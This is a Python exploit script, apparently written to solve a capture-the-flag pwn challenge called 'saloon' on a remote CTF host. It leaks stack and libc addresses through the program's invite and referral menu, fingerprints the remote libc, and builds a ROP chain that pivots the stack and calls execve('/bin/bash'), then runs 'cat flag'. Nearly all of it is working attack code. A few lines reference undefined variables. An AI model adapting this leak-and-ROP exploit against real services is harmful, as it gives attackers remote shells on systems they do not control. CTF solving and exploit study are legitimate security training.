#!/usr/bin/env python
#
# 0x7fffffffd990: 0x0000000000000000      0x00007fffffffd9f0
# 0x7fffffffd9a0: 0x2064656b636f6c42      0x2074736575716572
# 0x7fffffffd9b0: 0x5a5a5a206d6f7266      0x5a5a5a5a5a5a5a5a
# 0x7fffffffd9c0: 0x5a5a5a5a5a5a5a5a      0x5a5a5a5a5a5a5a5a
# 0x7fffffffd9d0: 0x4141416262626262      0x4141414141414141
#EBP + RET
# 0x7fffffffd9e0: 0x4141414141414141      0x4141414141414141
# 0x7fffffffd9f0: 0x5a5a5a5a5a005555      0x5a5a5a5a5a5a5a5a
# 0x7fffffffda00: 0x5a5a5a5a5a5a5a5a      0x62626262625a5a5a
# 0x7fffffffda10: 0x4141414141414141      0x4141414141414141
# 0x7fffffffda20: 0x4141414141414141      0x0000555555414141
# 0x7fffffffda30: 0x6262626262626262      0x0000000000000000


from concurrent.futures import ThreadPoolExecutor
import socket
import time
import chdrft.utils.proc as proc
import chdrft.utils.misc as misc
import subprocess as sp
import re
import traceback as tb
import struct
import chdrft.tube.connection as connection
from chdrft.dbg.gdbdebugger import GdbDebugger, launch_gdb
from chdrft.utils.elf import ElfUtils
import chdrft.tube.fifo as tube_fifo
import sys
import signal
import threading
import os
from chdrft.utils.libc import LibcDatabase
import chdrft.utils.fingerprinting as fingerprinting

send_wait = 0.10


class Program:
    invite_mod = 0x14
    choice_invite = 2
    invite_length = 0x1b
    referal_length = 0x3f
    choice_length = 0xa

    choice_invalid = 3
    choice_referal = 1

    def __init__(self, conn):
        self.conn = conn
        self.invite_count = 0
        self.want_output = True

    def set_choice(self, choice):
        buf = '%09d' % choice
        self.conn.send(buf)

    def referal(self, data):
        self.set_choice(self.choice_referal)
        self.send(data)
        self.get_output()

    def get_output(self):
        return self.conn.recv_until(
            misc.PatternMatcher.frombytes(b'Your choice: '),
            timeout=2)

    def send(self, data):
        self.conn.send(data)
        time.sleep(send_wait)

    def invalid_command(self):
        self.set_choice(self.choice_invalid)

    def invite_fast(self):
        self.set_choice(self.choice_invite)
        self.invite_count += 1
        self.conn.send('\x00'*0x1b)
        self.conn.send('\x00'*0x1b)
        if self.want_output:
            out = self.get_output()
            m = re.search(
                b'We are sorry (.*)There is no more room',
                out, re.MULTILINE)
            return m.group(1)

    def write_n_invites(self, n):
        buf = '%09d' % 2
        buf += '\x00'*(0x1b*2)
        step = 200
        self.invite_count += n
        for i in range(0, n, step):
            num = min(step, n-i)
            self.conn.send(buf*num)
            time.sleep(0.01)
            self.conn.trash()
            print('on send {}/{}\r'.format(i, n), end='')
            sys.stdout.flush()
        print()

    def invite(self, age, name):
        self.set_choice(2)
        self.invite_count += 1

        assert len(age) <= self.invite_length
        assert len(name) <= self.invite_length
        self.send(age)
        self.send(name)

        if self.want_output:
            out = self.get_output()
            m = re.search(
                b'We are sorry (.*)There is no more room',
                out, re.MULTILINE)
            return m.group(1)


class Rop:
    seg_off = 0x555555554000-0x00005555555550f7
    file = './saloon'

    def get_main_elf(off=0):
        return ElfUtils(Rop.file, offset=off)

    def __init__(self, x, libc_elf, stack_first_byte_guess):
        self.x = x
        self.libc_elf = libc_elf
        self.stack_first_byte_guess = stack_first_byte_guess

    def build(self, addr, stack_addr):
        self.elf = Rop.get_main_elf(addr+Rop.seg_off)
        self.g_rdi = self.elf.find_gadget('pop rdi; ret')
        self.g_rbp = self.elf.find_gadget('pop rbp; ret')
        self.g_leave = self.elf.find_gadget('leave; ret')
        self.g_read = self.elf.get_plt('read')
        self.g_ret = self.g_rdi+0x8
        self.g_pop24 = self.elf.find_gadget('pop rbp ; pop r14 ; pop r15 ; ret')
        self.g_read2 = self.elf.offset+0x409a
        self.g_read3 = self.elf.offset+0x109a  # mov edi, call read
        self.bss_offset = self.elf.get_section(
            '.bss').raw['sh_addr']+self.elf.offset
        self.stage1_addr = self.bss_offset+0x48
        self.invite_write_addr = self.elf.offset+0x202080

        if self.libc_elf is not None:
            self.g_rsi = self.libc_elf.find_gadget('pop rsi; ret')
            self.g_rdx = self.libc_elf.find_gadget('pop rdx; ret')
            self.g_execve = self.libc_elf.get_dyn_symbol('execve')
            #self.g_set_edx_pop_rbx = self.libc_elf.find_gadget(
            #    'mov edx, eax; mov eax, edx; pop rbx; ret')
            self.g_set_edx_pop_rbx = self.libc_elf.find_gadget(
                'mov edx, 0x140 ; pop rbx ; ret')
            assert self.g_rsi!=None
            assert self.g_rdx!=None
            assert self.g_execve!=None
            assert self.g_set_edx_pop_rbx!=None

        #-8 for ret
        stage1_off = 0xddd0
        #-0xa1d8-0x8
        self.ref_buf_addr = stack_addr-0x50+self.stack_first_byte_guess
        print('ref buf addr at ',
              hex(self.ref_buf_addr),
              'orig stack addr >>',
              hex(stack_addr))

        self.invite_count_start = Program.invite_mod-4
        self.invite_count_start = 5

        self.stage2_loop_entry = self.elf.offset+0x12dd
        self.ref_entry_1 = self.elf.offset+0x106e
        print('store_invite >> ', hex(self.invite_write_addr))

    def get_next_invite_write_addr(self, count=None):
        if cnt is None:
            count = self.x.invite_count
        pos = count % self.x.invite_mod
        return self.invite_write_addr+pos*0x10

    def write_continuous_buf(self, buf, include_ref=False):
        ref_pos = 0x10
        ref_len = 0x3f
        if isinstance(buf, str):
            buf = buf.encode('ascii')

        print(len(buf), ref_len)
        assert len(buf) <= ref_len+ref_pos
        self.x.referal(buf[ref_pos:])
        print('going for buf >> ', list(map(hex, buf)))
        self.x.invite(buf[0x30:0x31], buf[:ref_pos])

    def invite_num(self, v):
        return self.x.invite(str(v)+'\x00', '\x00')

    def get_stack(self, x):
        n = 0x1b
        data = bytearray()

        for i in range(n):
            res = x.invite('a'*(i+1), 'b'*(i+1))
            diff = len(res)-len(data)
            if diff > 0:
                data.extend(bytearray(b'a'*diff))
            assert len(res) == len(data)

            for j in range(i+1, len(res)):
                data[j-1] = res[j]
            data[len(res)-1] = 0
        stack = b'\x00'+bytes(data)
        print('stack >> ', stack)
        res = struct.unpack('<QQQ', stack[:24])
        return res

    def get_buf_overwrite_ebp(self, addr):
        buf = b''
        buf += b'a'*(0x40-0x15)
        buf += struct.pack('<Q', addr)

        assert buf[-1] == 0
        buf = bytearray(buf)
        for i in range(len(buf), 0, -1):
            if buf[i-1] != 0:
                buf[i] = 0xff
                break
        buf = bytes(buf)
        return buf

    def prepare_sprintf(self, buf):
        assert buf[-1] == 0
        buf = bytearray(buf)
        for i in range(len(buf), 0, -1):
            if buf[i-1] != 0:
                buf[i] = 0xff
                buf[i+1:] = bytearray(b'\x00')
                break
        buf = bytes(buf)
        return buf

    def prepare_stage2(self):
        self.x.write_n_invites(0x200)
        time.sleep(0.5)
        self.x.conn.trash(1)

        while self.x.invite_count % self.x.invite_mod != self.invite_count_start:
            self.invite_num(0)

        self.invite_num(self.g_rsi)

        # at libc+0x6c4bb : mov edx, eax; mov eax, edx; pop rbx; ret
        # -> set eax to high value before, with lot of invite calls
        # then inc eax
        load_eax = self.elf.offset+0x12cb
        inc_eax = self.elf.offset+0x12d1
        self.invite_num(load_eax)
        self.invite_num(self.g_set_edx_pop_rbx)

        # trash nothing
        set_eax_m1 = self.elf.offset+0xe31
        self.invite_num(set_eax_m1)

        # trash nothing
        self.invite_num(inc_eax)

        # go read
        # rbp still on stack => leave will put rsp on stack, where we control it
        # then all good
        ret_addr = self.elf.offset+0x1012
        self.invite_num(ret_addr)

        print('setting stage2 ', hex(ret_addr))

    def stage1(self):
        buf = b''
        buf += b'a'*(0x40-0x15)
        tmp_addr = self.invite_write_addr+self.invite_count_start*0x10
        print('stage2 addr at ', hex(tmp_addr))
        buf += struct.pack('<Q', tmp_addr)
        print('WRITTING >> ', hex(tmp_addr))

        buf = self.prepare_sprintf(buf)

        self.x.want_output = False
        # while self.x.invite_count%self.x.invite_mod!=self.x.invite_mod-2:
        #    self.invite_num(0)
        self.x.conn.trash(1)
        self.write_continuous_buf(buf)

    def stage2(self):

        buf_addr = self.ref_buf_addr
        x = misc.RopBuilder(buf_addr=buf_addr, ptr_size=8)

        if 0:
            #x.add_struct('<QQ$cont$Q', 0, self.g_rbp, self.g_leave)
            #x.add_struct('#path#^/usr/bin/bash\x00^#argv#$path$#env#Q', 0)
            #x.add_struct('#file#^/bin/bash\x00#mode#rb\x00')
            #x.add_struct('#cont#Q', buf_addr)
            #x.add_struct('<Q$file$', self.g_rdi)
            #x.add_struct('<QQ$', self.g_rsi, 0)
            ##x.add_struct('<Q$env$', self.g_rdx)
            #x.add_struct('<QQ', self.libc_elf.get_dyn_symbol('open'))
            #x.add_struct('<QQ', self.g_rdi, ref_buf_addr-0x200)
            #x.add_struct('<QQ', self.g_rsi, 100)
            #x.add_struct('<QQ', self.libc_elf.find_gadget('mov rdx, eax'))
            x.add_struct('<QQ', self.g_rdi, buf_addr)
            x.add_struct('<QQ', self.g_rsi, 0x200)
            x.add_struct('<QQ', self.g_rdx, 1)
            x.add_struct('<Q', self.libc_elf.get_dyn_symbol('write'))


        else:
            x.add_struct('<QQ$cont$Q', 0, self.g_rbp, self.g_leave)
            x.add_struct('#path#^/bin/bash\x00^#argv#$path$#env#Q', 0)
            x.add_struct('#cont#Q', buf_addr)
            x.add_struct('<Q$path$', self.g_rdi)
            x.add_struct('<Q$argv$', self.g_rsi)
            x.add_struct('<Q$env$', self.g_rdx)
            x.add_struct('<Q', self.libc_elf.get_dyn_symbol('execve'))


        res = x.build()

        time.sleep(0.5)
        self.x.conn.trash(1)
        input('have shell now')
        self.x.conn.send(res)

        time.sleep(0.5)
        input('send cmd')
        self.x.conn.send('cat flag; cat referals;\n')
        time.sleep(1)
        print(self.x.conn.recv(1024, timeout=misc.Timeout.from_sec(1)))
        print('done recv')

    def solve(self):
        self.x.get_output()
        self.x.want_output = True
        self.x.referal('a'*0x8)
        stack = self.get_stack(self.x)
        self.build(stack[1], stack[0])

        self.prepare_stage2()
        self.stage1()
        self.stage2()

    def exec_3instructions(self, insn_getter, *data):
        self.x.get_output()
        self.x.referal('a'*0x8)
        stack = self.get_stack(self.x)
        self.build(stack[1], stack[0])

        list_ins = insn_getter(*data)

        target_invite_count = 5
        target_invite_addr = self.invite_write_addr+0x10*target_invite_count
        # stopping 1 shy because we need great timing
        while self.x.invite_count % self.x.invite_mod != target_invite_count-1:
            self.invite_num(list_ins[0])

        # rbp-0x50
        target_buf_addr = target_invite_addr-0x50
        #print('want to set rbp at ', hex(target_invite_addr))

        ref_buf = b'a'*0x30
        run_name_age_once_addr = self.elf.offset+0x1180
        ref_buf += struct.pack('<Q', run_name_age_once_addr)
        self.x.referal(ref_buf)

        #print(' next round addr ', hex(run_name_age_once_addr))
        age_buf = b'a'*(3+8)
        tmp_addr = self.ref_buf_addr+0x38
        age_buf += struct.pack('<Q', tmp_addr)
        age_buf = self.prepare_sprintf(age_buf)
        age_buf = age_buf.ljust(Program.invite_length-3, b'a')
        age_buf += struct.pack('<Q', target_invite_addr)[:3]

        name_buf = 'a'*Program.invite_length

        #print('age buf:', age_buf)
        #print('name buf:', name_buf)
        #print('target rbp: ', hex(tmp_addr))
        #print('referal buf >> ', ref_buf, 'addr', hex(run_name_age_once_addr))
        #print('instruction list >> ', list(map(hex, list_ins)))

        #input('final go?')
        self.x.want_output = False
        self.x.invite(age_buf, name_buf)

        garbage = self.x.conn.recv_until(
            misc.PatternMatcher.frombytes(b'There is no more room.\n'),
            timeout=1)

        age_buf = str(self.g_leave).encode('ascii')
        age_buf = age_buf.ljust(Program.invite_length, b'\x00')
        # rsp=namebuf

        name_buf = b''
        name_buf += b'a'*8
        name_buf += struct.pack('<QQ', *list_ins[1:])

        self.x.send(age_buf+name_buf)

        garbage = self.x.conn.recv_until(
            misc.PatternMatcher.frombytes(b'There is no more room.\n'),
            timeout=2)

    def insn_getter_read(self, off, absolute):
        res = []
        res.append(self.elf.offset+0xf58)
        res.append(self.g_rdi)
        read_addr = off
        if not absolute:
            read_addr+=self.elf.offset
        print('TRIGGER READ at ', hex(read_addr), 'off', hex(off))

        res.append(read_addr)
        return res

    def do_single_read(self, elf_off, absolute):
        print('read at off ', hex(elf_off))
        self.exec_3instructions(self.insn_getter_read, elf_off, absolute)
        try:
            rem = self.x.conn.recv(n=1024, timeout=1)
            print('result of recv >> ', rem)
            return rem
        except EOFError:
            return b''


def test_formula_dbg(args):
    x = GdbDebugger()
    x.set_stop_solib_events(True)
    x.run()

    proc_helper = proc.ProcHelper(x.get_pid())

    regions = proc_helper.get_memory_regions()
    exe_path = proc_helper.get_exe_path()
    exe_offset = next(
        (i.start_addr
         for i in regions.regions
         if(i.file == exe_path and i.perms.has('x'))))

    start_addr = 0x125c+exe_offset
    ins_addr = 0x1289+exe_offset
    cnt_addr = 0x202044+exe_offset

    x.set_bpt(ins_addr)
    for i in range(100):
        x.mem.set_u32(cnt_addr, i)
        x.reg.rip = start_addr
        x.resume()
        res = x.reg.rdx
        print(hex(res))


def test_formula():
    launch_gdb(
        'solve', test_formula_dbg.__name__, './saloon')


def test_controlled_area():

    import lldb
    x = lldb.SBDebugger.Create()
    x.SetAsync(True)
    error = lldb.SBError()
    target = x.CreateTargetWithFileAndArch(
        './saloon_patched',
        lldb.LLDB_ARCH_DEFAULT)

    x.HandleCommand("log enable lldb all")
    #x.HandleCommand("log enable linux thread async process all");
    x.HandleCommand("log enable linux")
    with tube_fifo.ManagedBidirectionalFifo() as managed_fifo, ThreadPoolExecutor(max_workers=2) as tp:
        print('write ', managed_fifo.write_fifo)
        print('read ', managed_fifo.read_fifo)

        def fuu():
            print('try fifo')
            managed_fifo.__enter__()
            print('entered fifo')
        tp.submit(fuu)

        input('go?')
        p = target.Launch(x.GetListener(), None, None, managed_fifo.write_fifo,
                          managed_fifo.read_fifo, None,
                          None, lldb.eLaunchFlagDisableASLR, True, error)
        print('done launch')

# has to set breakpoint after register
        time.sleep(0.2)
        pid = p.GetProcessID()
        listener = x.GetListener()
        while True:
            event = lldb.SBEvent()
            if listener.WaitForEvent(1, event) and p.GetStateFromEvent(event) == lldb.eStateStopped:
                break
            print('waiting for init break')

        print('state', p.GetState())

        print('pid >> ', pid)
        proc_helper = proc.ProcHelper(pid)

        regions = proc_helper.get_memory_regions()
        exe_path = proc_helper.get_exe_path()
        exe_offset = next(
            (i.start_addr
             for i in regions.regions
             if(i.file == exe_path and i.perms.has('x'))))

        bp_addr = exe_offset+0x1175
        print('exe offset ', hex(exe_offset))
        print('num breakpoint ', target.GetNumBreakpoints())
        input('add bp?')

        bp = target.BreakpointCreateByAddress(bp_addr)
        #x.HandleCommand('b *0x%x'%bp_addr)
        assert bp.IsEnabled()

        print('num breakpoint ', target.GetNumBreakpoints())
        input('fuu')

        p.Continue()

        conn = managed_fifo
        try:
            print('start task1')
            conn.send(
                '{}\x00'.format(
                    Program.choice_referal).ljust(
                    Program.choice_length,
                    'a'))
            print('send')
            conn.send('A'*Program.referal_length)
            conn.send(
                '{}\x00'.format(
                    Program.choice_invite).ljust(
                    Program.choice_length,
                    'a'))
            conn.send('B'*Program.invite_length)
            conn.send('C'*Program.invite_length)

            time.sleep(0.2)
            print('state', p.GetState())

            while True:
                event = lldb.SBEvent()
                if listener.WaitForEvent(1, event) and p.GetStateFromEvent(event) == lldb.eStateStopped:
                    break
                print('waiting for breakpoint hit')

            th = p.GetSelectedThread()
            frame = th.GetSelectedFrame()
            sp = frame.GetSP()
            mem = p.ReadMemory(sp, 0x200, error)
            print(mem)
            input('done')

        except:
            tb.print_exc()
            input('laa')


class Solver:

    def __init__(self, orig_conn, cache):
        self.orig_conn = orig_conn
        self.elf = Rop.get_main_elf()
        self.libc_elf = None
        self.cache = cache
        self.stack_first_byte = 0

    def do_single_exec(self, f):
        self.orig_conn.shutdown()
        with self.orig_conn as conn:
            x = Program(conn)
            rop = Rop(x, self.libc_elf, self.stack_first_byte)
            return f(rop)

    want_off = (
        'write',
        'strlen',
        'htons',
        'snprintf',
        'close',
        'read',
        'listen',
        'signal',
        'strtoull',
        'fflush',
        'accept',
        'exit',
        'fork',
        'socket'
    )

    def do_read(self, have, sz, addr, absolute=False):
        while True:
            if len(have) == sz:
                break

            off = addr+len(have)
            res = self.do_single_exec(lambda x: x.do_single_read(off, absolute))
            have.extend(bytearray(res))
            have.append(0)
            del have[sz:]

    def build_offsets(self, recompute_libc_offset):

        if not 'offsets' in self.cache:
            cache.offsets = {}
        offsets = self.cache.offsets
        if recompute_libc_offset:
            offsets.clear()

        for elem in self.want_off:
            if not elem in offsets:
                offsets[elem] = bytearray()

            have = offsets[elem]
            if recompute_libc_offset:
                del have[:]
            self.do_read(have, 8, self.elf.get_reloc(elem))

    def libc_exact_compare(self, pattern, libc_db):
        results = []
        num_workers = 30
        with ThreadPoolExecutor(max_workers=num_workers) as executor:
            for f in libc_db.db.values():
                libc_file = f['file']

                def f(libc_file, pattern):
                    res = fingerprinting.libc_match(libc_file, pattern)
                    return (res, libc_file)
                results.append(executor.submit(f, libc_file, pattern))
        res=[]
        for i in results:
            success, libc = i.result()
            if success:
                print('Found for libc ', libc)
                res.append(libc)
        return res

    def identify_libc(self):
        offsets = self.cache.offsets

        libc_dir = '/home/benoit/server2/libcs'
        with LibcDatabase(libc_dir) as libc_db:
            pattern = {}
            for k in self.want_off:
                pattern[k] = struct.unpack('<Q', bytes(offsets[k]))[0]
            print(pattern)
            libcs = self.libc_exact_compare(pattern, libc_db)
            print('libcs found matching >> ', libcs)
            return libcs[0]

    def pwn(self):
        return

    def find_libc_offset(self):
        target_func = 'read'
        off = self.elf.get_reloc(target_func)
        file_off = self.libc_elf.get_dyn_symbol(target_func)
        res = bytearray()
        self.do_read(res, 8, off)
        print('READING >> ', res)
        ans = struct.unpack('<Q', res)[0]
        ans -= file_off
        return ans

    def find_first_stack_byte(self):
        found_list = []

        target_addr = self.elf.offset+0x181b
        # string that is nonzero

        for off in range(0, 0x100, 8):
            self.stack_first_byte = off
            print('trying stack first byte>> ', hex(off))

            try:
                res = bytearray()
                self.do_read(res, 1, target_addr)
                if res[0]==b'\x00':
                    continue

                found_list.append(off)
                print('found stack_first_byte at ', hex(off))
                # dont want to wait :)
                #break
            except KeyboardInterrupt:
                raise
            except Exception as e:
                tb.print_exc()
                pass
        return found_list[0]


def test_libc():
    libc_elf=ElfUtils('/usr/lib/libc.so.6')

    g_rsi = libc_elf.find_gadget('pop rsi; ret')
    g_rdx = libc_elf.find_gadget('pop rdx; ret')
    g_execve = libc_elf.get_dyn_symbol('execve')
    b = libc_elf.find_gadgets(
        'mov edx, eax; mov eax, edx; pop rbx; ret')
    a=libc_elf.x86_machine.get_disassembly('mov edx, eax; mov eax, edx; pop rbx; ret')
    print(a)
    print(b)
    sys.exit(0)


def solve_main(port, host, cache):
    # test_controlled_area()
    # test_formula()
    # return
    #test_libc()

    proc = None
    try:
        orig_conn = connection.Connection(port=port, host=host)
        solver = Solver(orig_conn, cache)

        recompute_stack_first_byte = 0
        if recompute_stack_first_byte or not 'stack_first_byte' in cache:
            cache.stack_first_byte = solver.find_first_stack_byte()

        solver.stack_first_byte = cache.stack_first_byte
        print('using stack_first_byte >> ', hex(solver.stack_first_byte))

        recompute_libc = 0
        recompute_libc_offset = 0
        if recompute_libc or not 'libc_file' in cache:
            solver.build_offsets(recompute_libc_offset)
            cache.libc_file = solver.identify_libc()
            cache.libc_file='/home/benoit/server2/libcs/libc_lsegir9c.so'

        libc_file = cache.libc_file
        print('remote libc used >> ', libc_file)
        solver.libc_elf = ElfUtils(libc_file)

        recompute_libc_offset = 0
        if recompute_libc_offset or not 'libc_offset' in cache:
            cache.libc_offset = solver.find_libc_offset()

        solver.libc_elf.offset = cache.libc_offset
        print('libc offset >> ', hex(solver.libc_elf.offset))

        #want='mov edx, eax; mov eax, edx; pop rbx; ret'
        #addr= solver.libc_elf.find_gadget(want)
        #print(addr)
        #tmp=bytearray()
        #solver.do_read(tmp, 10, addr, absolute=True)
        #a=solver.libc_elf.x86_machine.get_disassembly(want)
        #print(tmp, a)
        #return

        solver.do_single_exec(lambda x: x.solve())

        # with orig_conn as conn:
        #    test = False
        #    if test:
        #        rop = Rop(None, None)
        #        rop.build(0, 0)
        #    else:
        #        x = Program(conn)
        #        rop = Rop(x, cache)
        #        rop.build(0, 0)
        # rop.read_got(0)
        #        rop.solve2()
        # rop.solve()
        # rop.get_libc_offsets()

    except Exception as e:
        tb.print_exc()

        if proc:
            proc.kill()

if __name__ == '__main__':

    cache = None
    port, host = None, None
    local = 0

    if local:
        port, host = 1234, 'localhost'
        cache = misc.CacheDB(conf='local')
    else:
        port, host = 1405, 'wildwildweb.fluxfingers.net'
        cache = misc.CacheDB(conf='remote')

    with cache:
        solve_main(port, host, cache)
